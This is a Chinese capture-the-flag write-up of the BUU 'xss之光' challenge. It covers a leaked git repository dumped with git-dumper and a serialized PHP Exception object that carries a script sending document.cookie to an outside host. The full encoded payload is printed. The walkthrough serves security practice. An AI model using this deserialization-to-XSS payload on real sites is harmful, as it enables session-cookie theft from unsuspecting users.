---
{"dg-publish":true,"title":"BUU_[BJDCTF 2nd]xss之光","dg-path":"安全/靶场/BUU_[BJDCTF 2nd]xss之光.md","permalink":"/安全/靶场/BUU_[BJDCTF 2nd]xss之光/","dgPassFrontmatter":true}
---

进去发现就只有
![Pasted image 20241104211409.png](/img/user/picture/Pasted%20image%2020241104211409.png)

通过网站目录扫描工具，发现有git源码泄露
![Pasted image 20241104211630.png](/img/user/picture/Pasted%20image%2020241104211630.png)


用[git-dumper]()下载其源码
```shell
git-dumper http://website/ /root/workspace/tmp/
```

![Pasted image 20241104211844.png](/img/user/picture/Pasted%20image%2020241104211844.png)
发现其源码是一个反序列化，但是没有定义类，所以就利用php原生类
根据这一个题的题目可以推测这一个题的目的是利用XSS
最常见的就是利用XSS去获取Cookie

![Pasted image 20241104212738.png](/img/user/picture/Pasted%20image%2020241104212738.png)
可以看到php版本为5，所以我们要使用Exception类。

```php
<?php  
$poc = new Exception("<script>window.open('http://2b0f6770-883e-4dca-9d2d-8035b93f4cd7.node5.buuoj.cn/'+document.cookie);</script>");  
echo urlencode(serialize($poc));  
?>
```

输出：
```txt
O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A108%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2F2b0f6770-883e-4dca-9d2d-8035b93f4cd7.node5.buuoj.cn%2F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A35%3A%22C%3A%5CUsers%5C29495%5CDesktop%5Ctmp%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

执行后发现flag就在cookie中
![Pasted image 20241104213400.png](/img/user/picture/Pasted%20image%2020241104213400.png)


这一题具体怎么获取的cookie我并不是很清楚，应该是只要用XSS执行了跳转，服务器就会将cookie返回给你
